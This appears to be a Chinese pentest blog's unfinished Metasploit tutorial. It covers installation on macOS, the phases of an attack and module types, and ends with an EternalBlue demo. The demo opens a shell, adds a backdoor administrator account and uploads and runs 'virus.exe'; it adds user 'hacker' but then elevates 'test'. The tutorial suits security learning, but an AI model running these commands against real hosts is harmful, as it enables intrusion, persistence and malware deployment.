<!DOCTYPE html>
<html class="no-js" lang="en-us">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="theme-color" content="#1b1b1b">
	<title>Metasploit | drunk for pentest</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="stylesheet" href="/css/bundle.css">
	<link rel="icon" href="/icons/16.png" sizes="16x16" type="image/png">
	<link rel="icon" href="/icons/32.png" sizes="32x32" type="image/png">
		
</head>
<body class="body kind-page">
	<header class="header">
	<a class="logo" href="/">drunk for pentest</a>
	
</header>
	<div class="primary">
	
	<main class="main">
		
		<div class="single block">
			<article class="entry">
				<h1 class="entry__title">Metasploit</h1>
				<div class="entry__content"><h3 id="metasploit-使用方法">Metasploit 使用方法</h3>
<h5 id="0x0-安装">0x0 安装</h5>
<p>metasploit 分“开源版”和“付费pro版”，本文讨论开源版（付费pro版会有GUI界面，开源版只有命令行，kali系统自带metasploit不必手动安装，笔者使用mac，需要先安装一下）</p>
<p>安装方式一：</p>
<pre tabindex="0"><code>brew install metasploit-framework 
</code></pre><p>很慢，失败</p>
<p>安装方式二：先安装 wget, 再下载安装包</p>
<pre tabindex="0"><code>brew install wget
wget https://osx.metasploit.com/metasploitframework-latest.pkg
</code></pre><p>双击安装pkg（目录在 /opt/metasploit-framework/bin）
将执行目录添加到环境 vi ～/.bash_profile （此处略）</p>
<pre tabindex="0"><code>【一些细节 Tips】
如果mac连brew都没有，先执行下句安装 homebrew：
/bin/bash -c &#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&#34; //需要sudo密码，mac开启root方法略
</code></pre><p>执行 msfconsole 控制台，安装完成：</p>
<pre tabindex="0"><code>&gt;&gt; msfconsole
&gt;&gt; msf6&gt;
</code></pre><p>自带web api服务，控制台：https://localhost:5443/api/v1/auth/login）</p>
<hr>
<h3 id="0x1-metasploit-介绍">0x1 Metasploit 介绍</h3>
<p>一次完整的 metasploit 渗透过程，包括信息嗅探、漏洞利用、访问提权、取证和擦出记录这四个部分，具体如下:</p>
<pre tabindex="0"><code>1、 discover  
    - 信息获取  
    - 端口扫描：Nmap   
    - 漏洞扫描：neXpose  
    - 设备扫描  
2-3、 gain access &amp; take control 
    - 爆破  
    - 自动exp  
    - 手动exp  
    - 社会工程学  
    - 网路应用扫描渗透  
    - get shell  
    - 会话劫持  
    - 手动认证  
    - 防火墙&amp;VPN绕过  
4、 collect evidence  
    - 收集证据、日志、密钥  
*、 clean up  
    - 输出报告
</code></pre><hr>
<h3 id="0x2-metasploit-使用">0x2 Metasploit 使用</h3>
<p>metasploit 的使用如果比喻成导弹，分为三个系统：探测系统、传送系统、弹头</p>
<pre tabindex="0"><code>1、扫漏洞
2、选一个 payload 模块进入
    - 配置 options
    - 可选配置
    - run
3、...
</code></pre><pre tabindex="0"><code>exploit和payload的区别：
- exploit是传送系统，playload是用来实际做什么代码（弹头）
1、exploits模块
命名规则：系统/服务/名称
例如：windows/smb/ms08_067_netapi
RHOST：目标主机IP地址
RPORT：目标主机连接端口
Payload：有效的载荷，成功后返回shell
LHOST：攻击者的IP地址
LPORT：攻击者的端口
2、payloads模块
是在使用一个模块之后再去使用的。
命名规则：系统/类型/名称
例如：Windows/dllinject/reverse_tcp
类型命名规则
shell：上传一个shell。
dllinject：注入一个dll到进程。
patchup***：修补漏洞。
upexec：上传并执行一个文件。
meterpreter：高级的payload。
vncinject：高级的payload。
passive：高级的payload。
</code></pre><p>一个简单的demo(永恒之蓝)</p>
<pre tabindex="0"><code>&gt;&gt; msfconsole //进入控制台
&gt;&gt; use exploit/windows/smb/ms17_010_eternalblue //用这个模块
&gt;&gt; show options //看看需要填啥
&gt;&gt; set rhosts 192.168.13.29 //按照提示设置一大堆set
&gt;&gt; run //开始攻击
meterpreter &gt; 
meterpreter &gt; shell //进去了
shell &gt; net user hacker 1234 /add //创建用户
shell &gt; net localgroup administrators test /add //设为管理员
meterpreter &gt; upload /root/virus.exe
meterpreter &gt; execute -f c:\\virus.exe
</code></pre><p>(未完待续)</p></div>
				
			</article>
		</div>
	</main>
	
	



	

	</div>
	<footer class="footer">
	<div class="footer__copyright">© 2023 drunk for pentest. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
</footer>
</body>
</html>